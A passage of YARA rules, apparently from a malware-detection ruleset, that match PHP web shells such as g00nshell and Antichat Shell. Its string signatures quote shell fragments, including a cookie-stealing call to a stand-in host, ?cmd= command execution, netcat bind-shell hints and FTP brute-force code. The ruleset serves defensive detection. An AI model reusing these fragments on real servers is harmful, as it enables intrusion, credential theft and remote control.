      $s9 = "p('<table border=\"0\" cellpadding=\"3\" cellspacing=\"0\">');" fullword ascii
      $s10 = "p('DBHost:');" fullword ascii
      $s11 = "$dbs[$db['Database']] = $db['Database'];" fullword ascii
      $s12 = "$table_num = $table_rows = $data_size = 0;" fullword ascii
      $s13 = "if (!preg_match('#<\\?#si', $phpcode)) {" fullword ascii
      $s14 = "p('Your Port:');" fullword ascii
      $s15 = "m('Backup failed');" fullword ascii
      $s16 = "foreach($querys as $num=>$query) {" fullword ascii
      $s17 = "$querys = @explode(';',$sql_query);" fullword ascii
      $s18 = "$data_size = sizecount($data_size);" fullword ascii
      $s19 = "p('<td>'.$table['Collation'].'</td>');" fullword ascii
      $s20 = "if ($tablename && !$sql_query) {" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xbbef ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _0c942886f8e0aaf5b824f222c3ed84cb_8d23f3d3f678d3e620b91c2115e1f714_adminer_4_1_0_mysql_adminer_4_2_4_2_Adminer___Compact_dat_183
{
   meta:
      description = "php17 - from files 0c942886f8e0aaf5b824f222c3ed84cb.php, 8d23f3d3f678d3e620b91c2115e1f714.php, adminer-4.1.0_mysql.php, adminer-4.2.4_2.php, Adminer_-_Compact_database_management.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "717b6e76292bef4523fe8f3d85efb76bf586ab40a3e46404bf5b91901a26fa09"
      hash2 = "a8d9f5df8a604e75e87670bc1d797bb49cc1047f722a8630bda514fdc407f84f"
      hash3 = "21f2c335b1d7810398862df20ab65ab1c67b188ce80f71d11fe32071f0894ebe"
      hash4 = "ea21b95da1a2f66d26849160f3257823254663144e6b3b506c35160b70c7b3bd"
      hash5 = "4baf99c68ca9632081ba8bc0458bfc87fc70e526742803b7b77a45f70d7adf07"
   strings:
      $s1 = "selectLimitProcess(){return(isset($_GET[\"limit\"])?$_GET[\"limit\"]:\"50\");}function" fullword ascii
      $s2 = "\\0\");}elseif($_GET[\"file\"]==\"default.css\"){header(\"Content-Type: text/css; charset=utf-8\");echo" fullword ascii
      $s3 = "\");}elseif($_GET[\"file\"]==\"functions.js\"){header(\"Content-Type: text/javascript; charset=utf-8\");echo" fullword ascii
      $s4 = "<script type='text/javascript'>focus(document.getElementById('name'));</script>" fullword ascii
      $s5 = "Min_DB{var$extension=\"MySQL\",$server_info,$affected_rows,$errno,$error,$_link,$_result;function" fullword ascii
      $s6 = "\".($_POST[\"data_style\"]?\"SET foreign_key_checks = 0;" fullword ascii
      $s7 = "is_utf8($X){return(preg_match('~~u',$X)&&!preg_match('~[\\\\0-\\\\x8\\\\xB\\\\xC\\\\xE-\\\\x1F]~',$X));}function" fullword ascii
      $s8 = "restart_session(){if(!ini_bool(\"session.use_cookies\"))session_start();}function" fullword ascii
      $s9 = "ERVER][$_GET[\"username\"]];}function" fullword ascii
      $s10 = "->errno=mysql_errno($this->_link);$this->error=mysql_error($this->_link);return" fullword ascii
      $s11 = "<script type=\"text/javascript\">setupSubmitHighlight(document);</script>" fullword ascii
      $s12 = "echo\"<tr><td><textarea name='databases' rows='10' cols='20'></textarea>\";}echo'</table>" fullword ascii
      $s13 = "<table cellspacing=\"0\" onclick=\"tableClick(event);\" ondblclick=\"tableClick(event, true);\" class=\"nowrap checkable\">" fullword ascii
      $s14 = "PDO{var$_result,$server_info,$affected_rows,$errno,$error;function" fullword ascii
      $s15 = "selectImportPrint(){return!information_schema(DB);}function" fullword ascii
      $s16 = "false;$this->_result->_offset=0;return@$this->_result->nextRowset();}function" fullword ascii
      $s17 = "get_rows(\"SELECT ROUTINE_NAME, ROUTINE_TYPE, DTD_IDENTIFIER FROM information_schema.ROUTINES WHERE ROUTINE_SCHEMA = \".q(DB));}" ascii
      $s18 = "get_rows(\"SELECT ROUTINE_NAME, ROUTINE_TYPE, DTD_IDENTIFIER FROM information_schema.ROUTINES WHERE ROUTINE_SCHEMA = \".q(DB));}" ascii
      $s19 = "TmpFile{var$handler;var$size;function" fullword ascii
      $s20 = "lzw_decompress(\"\\0\\0\\0` \\0" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _05311655a15b75fab86956663e1819cd_0ad17701cf5e5a59aa57f35aa240d9e40d28ba50_0b544ac96e173af11ffee87dee8aad446339801e_32e36b9c_184
{
   meta:
      description = "php17 - from files 05311655a15b75fab86956663e1819cd.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash2 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash3 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash4 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash5 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash6 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
   strings:
      $s1 = "<center><a href=\\\"\".$surl.\"act=processes&grep=\".basename($binpath).\"\\\"><u>View datapipe process</u></a></center>\";}" fullword ascii
      $s2 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
      $s3 = "xp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>" fullword ascii
      $s4 = "\\\"><u>View binder's process</u></a></center>\";}" fullword ascii
      $s5 = "array(\"<b>Proc.</b>\",$surl.\"act=processes&d=%d\")," fullword ascii
      $s6 = "else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\").\":\".$datapipe[\"port\"].\", and you will connect" ascii
      $s7 = "else {echo \"Binding... ok! Connect to <b>\".getenv(\"SERVER_ADDR\").\":\".$bind[\"port\"].\"</b>! You should use NetCat&copy;, " ascii
      $s8 = "?><b>Binding port:</b><br><form action=\"<?php echo $surl; ?>\"><input type=hidden name=act value=tools><input type=hidden name=" ascii
      $s9 = ";Password: <input type=text name=\"bind[pass]\" value=\"<?php echo htmlspecialchars($bind[\"pass\"]); ?>\">&nbsp;<select name=\"" ascii
      $s10 = "<div align=\"center\">Useful Commands " fullword ascii
      $s11 = "<td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"<?php echo $surl; ?>act=search&d=<?php echo urlencode($d);" ascii
      $s12 = "<b>Back connection:</b><br><form action=\"<?php echo $surl; ?>\"><input type=hidden name=act value=tools><input type=hidden name" ascii
      $s13 = "; ?>\">&nbsp;<select name=\"datapipe[src]\"><?php" fullword ascii
      $s14 = "\"<?php echo $d; ?>\">HOST: <input type=text name=\"datapipe[remoteaddr]\" value=\"<?php echo htmlspecialchars($datapipe[\"remot" ascii
      $s15 = "<input name=\"q\" type=\"text\" id=\"q\" value=\"<?php echo wordwrap(php_uname()); ?>\">" fullword ascii
      $s16 = "array(\"<b>Update</b>\",$surl.\"act=update&d=%d\")," fullword ascii
      $s17 = "array(\"<b>Tools</b>\",$surl.\"act=tools&d=%d\")," fullword ascii
      $s18 = "<b>Back connection:</b><br><form action=\"<?php echo $surl; ?>\"><input type=hidden name=act value=tools><input type=hidden name" ascii
      $s19 = "mit value=\\\"calculate\\\"><br><br></center><b>Hashes</b>:<br><center>\";" fullword ascii
      $s20 = "$d); ?>\"><b>Shadow's tricks :D </b></a> ::</b></p></td></tr>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _1bc95c69745b50619a937e830bc085b2c6c90094_70fe072e120249c9e2f0a8e9019f984aea84a504_185
{
   meta:
      description = "php17 - from files 1bc95c69745b50619a937e830bc085b2c6c90094.php, 70fe072e120249c9e2f0a8e9019f984aea84a504.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "565d9583cf9b7117ba1c7af86a0f8e520fad9b02397f34b6ac784094d9b4eba4"
      hash2 = "49839366d5f1b15ed9c222aa11bfe0d8aa96250944a8db6d8a0024509b780376"
   strings:
      $x1 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword ascii
      $x2 = "$pass = \"8634361d1a2e44420f44ef3612706bb5\"; // MD5 encoded Password" fullword ascii
      $s3 = "#'http://site.com/shl.php?cookie='+document.cookies</script> #" fullword ascii
      $s4 = "$user = \"55c4b3899b00d20543d41170d2775e8f\"; // MD5 encoded User" fullword ascii
      $s5 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword ascii
      $s6 = "'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill'=" ascii
      $s7 = "#Ex: http://site.com/shl.php?cmd=whoami #" fullword ascii
      $s8 = ". $_GET['db'] . \"&table=\" . $row[0] .\"&sqlf=dl'>Download</a>]</td></tr>\\n\");" fullword ascii
      $s9 = "#1: User-Agent required #" fullword ascii
      $s10 = "target='frm'>\" . $link . \"</a> ] \");}}" fullword ascii
      $s11 = "# g00nshell v1.3 final #" fullword ascii
      $s12 = "#it would probably be wise to delete it and check your logs. #" fullword ascii
      $s13 = "#clorox - Beta testing #" fullword ascii
      $s14 = "#TrinTiTTY - Beta testing #" fullword ascii
      $s15 = "#pr0be - Beta testing & CSS #" fullword ascii
      $s16 = "echo(\"<input name='cmd' type='text' size='50'> \");" fullword ascii
      $s17 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_passwor" ascii
      $s18 = "width='18'> \" . $file['link'] . \"</td><td>\" . $file['size'] . \"</td></tr>\\n\";}" fullword ascii
      $s19 = "#To steal cookies, use ?cookie=___ in the url. #" fullword ascii
      $s20 = "else{$folder = \"<img src='?img=\" . $file['icon']. \"'> \" . $file['link'];}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 90KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _00392828ffb7aabd6c66ca775f1356eef850c8b7_5fa1008e2c1a5dee4ca91638903563e6eff10569_8786355027e9ea8b98725019f1d594fd194cd412_186
{
   meta:
      description = "php17 - from files 00392828ffb7aabd6c66ca775f1356eef850c8b7.php, 5fa1008e2c1a5dee4ca91638903563e6eff10569.php, 8786355027e9ea8b98725019f1d594fd194cd412.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "19ddef3ac56931999f086573be93b5385319b35081e9d5dbce0b8e3e16f85a64"
      hash2 = "0a0944635d48b8d4a44068847e8958710c644233a5227bc193bbd34999dc2131"
      hash3 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
   strings:
      $s1 = "'<td width=1 align=right><nobr><select onchange=\"g(null,null,null,null,null,this.value)\"><optgroup label=\"Page charset\">'.$o" ascii
      $s2 = "params += \"&\"+document.mf.elements[i].name+\"=\"+encodeURIComponent(document.mf.elements[i].value);" fullword ascii
      $s3 = "function printLogin() {" fullword ascii
      $s4 = "charsets.'</optgroup></select><br><span>Server IP:</span><br>'.gethostbyname($_SERVER[\"HTTP_HOST\"]).'<br><span>Client IP:</spa" ascii
      $s5 = "echo 'Fail!<script>document.mf.p3.value=\"\";</script>';" fullword ascii
      $s6 = "} else echo 'Bad time format!<script>document.mf.p3.value=\"\";</script>';" fullword ascii
      $s7 = "$_SESSION['cwd'] = @$_POST['c'];" fullword ascii
      $s8 = "<td>Login</td>" fullword ascii
      $s9 = "echo '<script>document.mf.p1.value=\"\";document.mf.p2.value=\"\";</script>';" fullword ascii
      $s10 = "$gid = @posix_getgrgid(@fileowner($_POST['p1']));" fullword ascii
      $s11 = "req.open(\"POST\", url, true);" fullword ascii
      $s12 = "echo '<form onsubmit=\"g(null,null,null,null,this.text.value);return false;\"><textarea name=text class=bigarea>';" fullword ascii
      $s13 = "<br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'." fullword ascii
      $s14 = "echo 'Saved!<br><script>document.mf.p3.value=\"\";</script>';" fullword ascii
      $s15 = "<form name=\"sf\" method=\"post\">" fullword ascii
      $s16 = "function printHeader() {" fullword ascii
      $s17 = "req = new ActiveXObject(\"Microsoft.XMLHTTP\");" fullword ascii
      $s18 = "<form name=files method=post>" fullword ascii
      $s19 = "echo '<h1>File manager</h1><div class=content>';" fullword ascii
      $s20 = "e=c value=\"\"><input type=submit value=\">>\"></form></td>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86__187
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 1dc03138e5406f8e1f850181e92084ed0f4b5302.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 691a4634dc5f78ceee68850138b8b68047b8dca6.php, 7bd7bb6237c7654d933dc363cabbc553f9d21382.php, 91241fc05105627c2f58942867db10b2b691574e.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash3 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash4 = "bbbdf28407a4c943f048dcdd7da7515e42797a64b76fd2455e5403b436ec4de8"
      hash5 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash6 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash7 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash8 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
      hash9 = "617ed1a8b61dd1f84acd225bfe8dc36c479a1ad3c98b2bb335b2735cb4fb2fe7"
      hash10 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
      hash11 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash12 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash13 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash14 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash15 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash16 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $x1 = "if(@ftp_login($connection,$user,$user)) { echo \"[+] $user:$user - success\\r\\n\"; $suc++; }" fullword ascii
      $s2 = "'eng_text87'=>'Download files from remote ftp-server'," fullword ascii
      $s3 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))));" fullword ascii
      $s4 = "]):(\"/ftp-dir/file\"))).in('hidden','cmd',0,'ftp_file_down'));" fullword ascii
      $s5 = "]):(\"/ftp-dir/file\"))).in('hidden','cmd',0,'ftp_file_up'));" fullword ascii
      $s6 = "$connection = @ftp_connect($ftp_server,$ftp_port,10);" fullword ascii
      $s7 = "if ($_POST['cmd']==\"ftp_brute\")" fullword ascii
      $s8 = "'eng_text100'=>'Send file to remote ftp server'," fullword ascii
      $s9 = "if(@function_exists('bzcompress')) { $arh .= in('radio','compress',0,'bzip').' bzip'; }" fullword ascii
      $s10 = "'eng_text96'=>'Can\\'t get users list'," fullword ascii
      $s11 = "'eng_text94'=>'FTP-bruteforce'," fullword ascii
      $s12 = "'eng_text86'=>'Download files from server'," fullword ascii
      $s13 = "'eng_text95'=>'Users list'," fullword ascii
      $s14 = "'eng_butt14'=>'Download'," fullword ascii
      $s15 = "idden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt14']));" fullword ascii
      $s16 = "if(@function_exists(\"ftp_connect\")){" fullword ascii
      $s17 = "echo sr(15,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').i" ascii
      $s18 = "echo sr(15,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').i" ascii
      $s19 = "if(@function_exists('gzencode'))   { $arh .= in('radio','compress',0,'gzip').' gzip'; }" fullword ascii
      $s20 = "if(@function_exists('gzcompress')) { $arh .= in('radio','compress',0,'zip').' zip';   }" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1f1a80153e0fc2ec0b688b66949afb49f1897914_8c5b26f383a4b176a12657b913f35d2a639ea054_antichat_Antichat_Shell__Modified_by_Go0o_188
{
   meta:
      description = "php17 - from files 1f1a80153e0fc2ec0b688b66949afb49f1897914.php, 8c5b26f383a4b176a12657b913f35d2a639ea054.php, antichat.php, Antichat_Shell._Modified_by_Go0o.php, Antichat_Shell_Modified_by_Go0o.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "da39f93031e1ca0bd919e5a062b01d0bf39b52e88919ebae40a1379523ccab37"
      hash2 = "f633b6f8fbec621cd8ce60cd786926d3f4a552cc75375ec875ee8e9e4735ba4b"
      hash3 = "6d7af399cf9d9ef4f90454a35ad31bc41884035c8c7a5d12ff924007a698a039"
      hash4 = "4bbf0521ec9f2c1ebcfba9da1f0008df21b7199327ea9b475c3fdd707d918b23"
      hash5 = "cdd96e4dcce2cd8c3156108eec776d5c40879fb01b0ea80dfa190e8f3e51cb05"
   strings:
      $s1 = "$content.=\"<form name='mysql_dump' action='$php_self' method='post'>" fullword ascii
      $s2 = "$content.=\"<table cellSpacing=0 border=2 style=\\\"border-color:black;\\\" cellPadding=0 width=\\\"100%\\\">\";" fullword ascii
      $s3 = "else if(!empty($_POST['dif'])&&!$fp) { $content.=\"<center><b>" fullword ascii
      $s4 = "ilename></td></tr><tr><td><input type=file name=file> <input type=submit name=uploadloc value='Upload local file'></td></tr>\";" fullword ascii
      $s5 = "$content.=\"<tr><td>Select drive:\";" fullword ascii
      $s6 = "'allfuncsh'=>'All function for work shell was disabled.'" fullword ascii
      $s7 = "$content.=\"<tr><td><form method=POST><br>Open directory:  <input type=text name=dir value=\\\"\".$dir.\"\\\" size=50><input typ" ascii
      $s8 = "$content.=\"<tr><td><form method=POST><br>Open directory:  <input type=text name=dir value=\\\"\".$dir.\"\\\" size=50><input typ" ascii
      $s9 = "<tr><td>&nbsp;<textarea  class='inputbox' name='chars_de' cols='50' rows='5'>\".$chars_de.\"</textarea></td>" fullword ascii
      $s10 = "$stdata.=\"<tr><td><form method=POST>" fullword ascii
      $s11 = "'dircrterr'=>'Don\\'t create dir.'," fullword ascii
      $s12 = "'dircrt'=>'Dir is created.'," fullword ascii
      $s13 = "else $content.=\"<center><b>" fullword ascii
      $s14 = "'onlyracc'=>'Don\\'t edit, only read access.'," fullword ascii
      $s15 = "'uploadok'=>'File was successfully uploaded.'," fullword ascii
      $s16 = "'dontwrdir'=>'Only read current dir.'," fullword ascii
      $s17 = "'filext'=>'File already exists.'," fullword ascii
      $s18 = "foreach ($mn as $come=>$lee) {" fullword ascii
      $s19 = "'empty'=>'Directory not empty or access denide.'," fullword ascii
      $s20 = ":<b>\".$pass_de.\"</b></td>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _0c942886f8e0aaf5b824f222c3ed84cb_adminer_4_1_0_mysql_adminer_4_2_4_2_189
{
   meta:
      description = "php17 - from files 0c942886f8e0aaf5b824f222c3ed84cb.php, adminer-4.1.0_mysql.php, adminer-4.2.4_2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "717b6e76292bef4523fe8f3d85efb76bf586ab40a3e46404bf5b91901a26fa09"
      hash2 = "21f2c335b1d7810398862df20ab65ab1c67b188ce80f71d11fe32071f0894ebe"
      hash3 = "ea21b95da1a2f66d26849160f3257823254663144e6b3b506c35160b70c7b3bd"
   strings:
      $s1 = "tetable.html#SQL-CREATETABLE-REFERENCES\",'mssql'=>\"ms174979.aspx\",'oracle'=>\"clauses002.htm#sthref2903\",)),'<p>" fullword ascii
      $s2 = "/a>\\n\":\"\").\"\";if(support(\"dump\"))echo\"<a href='\".h(ME).\"dump=\".urlencode(isset($_GET[\"table\"])?$_GET[\"table\"]:$_" ascii
      $s3 = "($_POST[\"referer\"])?$_POST[\"referer\"]:$_SERVER[\"HTTP_REFERER\"]),'\">" fullword ascii
      $s4 = "strtr(number_format($X,0,\".\",lang(5)),preg_split('~~u',lang(6),-1,PREG_SPLIT_NO_EMPTY));}function" fullword ascii
      $s5 = "\"<script type='text/javascript'>ajaxSetHtml('\".js_escape(ME).\"script=db');</script>\\n\";}}}page_footer();" fullword ascii
      $s6 = ").\"'>\\n\";}echo'<input type=\"hidden\" name=\"token\" value=\"',$T,'\">" fullword ascii
      $s7 = "','nl'=>'Nederlands','no'=>'Norsk','pl'=>'Polski','pt'=>'Portugu" fullword ascii
      $s8 = "'').(SERVER!==null?DRIVER.\"=\".urlencode(SERVER).'&':'').(isset($_GET[\"username\"])?\"username=\".urlencode($_GET[\"username\"" ascii
      $s9 = "'selectSearchSearch(this);'></div>\\n\";}}echo\"</div></fieldset>\\n\";}function" fullword ascii
      $s10 = "confirm(){return\" onclick=\\\"return confirm('\".lang(0).\"');\\\"\";}function" fullword ascii
      $s11 = "<input type=\"submit\" name=\"delete\" value=\"',lang(18),'\"',confirm(),'>" fullword ascii
      $s12 = "entById('form').getElementsByTagName('td')[1].firstChild);</script>\\n\"));if(isset($_GET[\"select\"]))hidden_fields(array(\"che" ascii
      $s13 = "name=\"token\" value=\"',$T,'\">" fullword ascii
      $s14 = "<input type=\"submit\" name=\"edit\" value=\"',lang(10),'\">" fullword ascii
      $s15 = "me=\"token\" value=\"',$T,'\">" fullword ascii
      $s16 = "s','pt-br'=>'Portugu" fullword ascii
      $s17 = "<input type=\"submit\" value=\"',lang(14),'\">" fullword ascii
      $s18 = "IVER]);define(\"DB\",$_GET[\"db\"]);define(\"ME\",preg_replace('~^[^?]*/([^?]*).*~','\\\\1',$_SERVER[\"REQUEST_URI\"]).'?'.(sid(" ascii
      $s19 = "ble|decimal\"=>\"+/-\",\"date\"=>\"+ interval/- interval\",\"time\"=>\"addtime/subtime\",\"char|text\"=>\"concat\",));}define(\"" ascii
      $s20 = "(array)$_POST[\"check\"],\"clone\"=>$_POST[\"clone\"],\"all\"=>$_POST[\"all\"]));echo'<input type=\"hidden\" name=\"referer\" va" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0353ab4cbed5beae847a7ff6e220b5cf_0771fc6f0f4b1d7d1bb73bbbe14e0e31_502adcbc50636b667202497c1f398a36413e3284_63187568f13bf233_190
{
   meta:
      description = "php17 - from files 0353ab4cbed5beae847a7ff6e220b5cf.php, 0771fc6f0f4b1d7d1bb73bbbe14e0e31.php, 502adcbc50636b667202497c1f398a36413e3284.php, 63187568f13bf233f781f008c528b0e160650211.php, 6f53dce817b117198fc0950d87e362fdcf7852e2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b6f96297c1c905e32413c6deb7e794cb8a1af37b9295e5cff257a6ff063ccbd4"
      hash2 = "faeff8e37876023a6f84c94e090b22c9b3eea333ed96d2688c45d8900f7cfdbc"
      hash3 = "80fa31cc87c2618a5ea267baed3707f78b4b7d4a20cc8a91b231d5ce1d1a42e8"
      hash4 = "2a5f0fc4984d08fa9e8c3c5ccda1b09438d6bd04a7f962844088a6c45e248d71"
      hash5 = "1dc571ae9a2775e50505fa455a9d32b6953bc00e16afbe7fc225e8993b2e6c7a"
   strings:
      $x1 = "if ($win) {$file = \"C:\\\\tmp\\\\dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $x2 = "# \".gethostbyname($SERVER_ADDR).\" (\".$SERVER_ADDR.\")\".\" dump db \\\"\".$db.\"\\\"" fullword ascii
      $x3 = "else {$file = \"/tmp/dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $x4 = "if (file_get_contents($v)) {echo \"<b><font color=\\\"red\\\">You can't crack winnt passwords(\".$v.\") </font></b><br>\";}" fullword ascii
      $s5 = "# MySQL version: (\".mysql_get_server_info().\") running on \".$SERVER_ADDR.\" (\".$SERVER_NAME.\")\".\"" fullword ascii
      $s6 = "if (!$ret) {echo \"Can't execute \\\"ps -aux\\\"!\";}" fullword ascii
      $s7 = "if (!function_exists(\"gchds\")) {function gchds($a,$b,$c,$d=\"\") {if ($a == $b) {return $c;} else {return $d;}}}" fullword ascii
      $s8 = "ch_name_regexp,1,\" checked\").\"> - regexp" fullword ascii
      $s9 = "return substr($content, 0, $len).\"...\".substr($content, -$len);" fullword ascii
      $s10 = "if (ereg(\"phpBB 2.(.*) auto-generated config file\",$r))" fullword ascii
      $s11 = "<br><br><input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Search\\\"></form>\";" fullword ascii
      $s12 = "$gr = @posix_getgrgid(filegroup($v));" fullword ascii
      $s13 = "$ow = @posix_getpwuid(fileowner($v));" fullword ascii
      $s14 = "<br><br><input type=\\\"checkbox\\\" name=\\\"search_text_regexp\\\" value=\\\"1\\\" \".gchds($search_text_regexp,1,\" checked\"" ascii
      $s15 = "&nbsp;&nbsp;<input type=\\\"checkbox\\\" name=\\\"search_text_wwo\\\" value=\\\"1\\\" \".gchds($search_text_wwo,1,\" checked\")." ascii
      $s16 = "<b>Search for (file/directory name): </b><input type=\\\"text\\\" name=\\\"search_name\\\" size=\\\"\".round(strlen($search_name" ascii
      $s17 = "&nbsp;&nbsp;<input type=\\\"checkbox\\\" name=\\\"search_text_not\\\" value=\\\"1\\\" \".gchds($search_text_not,1,\" checked\")." ascii
      $s18 = "&nbsp;&nbsp;<input type=\\\"checkbox\\\" name=\\\"search_text_wwo\\\" value=\\\"1\\\" \".gchds($search_text_wwo,1,\" checked\")." ascii
      $s19 = "&nbsp;&nbsp;<input type=\\\"checkbox\\\" name=\\\"search_text_not\\\" value=\\\"1\\\" \".gchds($search_text_not,1,\" checked\")." ascii
      $s20 = "$data = unserialize(base64_decode($data));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _3926ab64dcf04e87024011cf39902beac32711da_51404e79871cd663777b69738ce8007da652ce3a_51e611f74860f4929ec79a6d2e3ad2d241daffc9_191
{
   meta:
      description = "php17 - from files 3926ab64dcf04e87024011cf39902beac32711da.php, 51404e79871cd663777b69738ce8007da652ce3a.php, 51e611f74860f4929ec79a6d2e3ad2d241daffc9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
      hash2 = "90b86d5a932acb4c649f57184b9d7769be68258c4b428db58b3bcac9b3c6ab2e"
      hash3 = "2007b51bc5e36689b15953fde226aad278c353f643faf2966b6059c12b42a295"
   strings:
      $s1 = "$headers .= \"Content-Type: text/html; charset=\\\"UTF-8\\\"\\r\\nContent-Transfer-Encoding: 8bit\\r\\n\\r\\n\";" fullword ascii
      $s2 = "$headers .= \"Content-Type: multipart/mixed; boundary=\\\"\".$rand.\"\\\"\\r\\n\\r\\n\";" fullword ascii
      $s3 = "if(send_email($mailFrom, $mailTo, $mailSubject, $mailContent, $mailAttachment)) output(\"Mail sent to \".html_safe($mailTo));" fullword ascii
      $s4 = "<tr><td colspan='2'><textarea id='mailContent' style='height:140px;min-height:140px;'></textarea></td></tr>" fullword ascii
      $s5 = "$headers .= \"Content-Type: application/octet-stream; name=\\\"\".basename($file).\"\\\"\\r\\n\";" fullword ascii
      $s6 = "$headers .= \"Content-Transfer-Encoding: base64\\r\\n\";" fullword ascii
      $s7 = "if(isset($p['mailFrom'])&&isset($p['mailTo'])&&isset($p['mailSubject'])&&isset($p['mailContent'])){" fullword ascii
